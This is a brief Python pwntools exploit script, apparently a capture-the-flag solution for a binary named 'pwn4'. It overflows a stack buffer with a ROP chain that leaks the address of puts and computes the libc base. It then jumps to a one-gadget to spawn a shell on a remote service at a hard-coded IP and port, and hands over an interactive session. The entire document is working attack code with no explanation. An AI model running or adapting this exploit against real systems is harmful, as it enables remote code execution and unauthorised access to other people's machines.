from pwn import *
from LibcSearcher import *
elf = ELF('./pwn4')
lb=ELF('libc6_2.23-0ubuntu10_amd64.so')
# print 'GOT:'+hex(elf.got['puts'])

#print puts_got
puts_GOT=elf.got['puts']

puts_libc=lb.sym['puts']

payload1='a'*8+'b'*8+p64(0x601280)+p64(0x4007d3)+p64(puts_GOT)+p64(0x400725) #get puts

p=remote("114.116.54.89",10004)

p.recv()

p.send(payload1)

p.recvuntil('fail\n')

addr=u64(p.recv(6)+'\x00\x00')

print hex(addr)

p.recv()

basic=addr-puts_libc

get_shell_addr=basic+0x4526A

print hex(get_shell_addr)


p.send('a'*24+p64(get_shell_addr))

p.interactive()



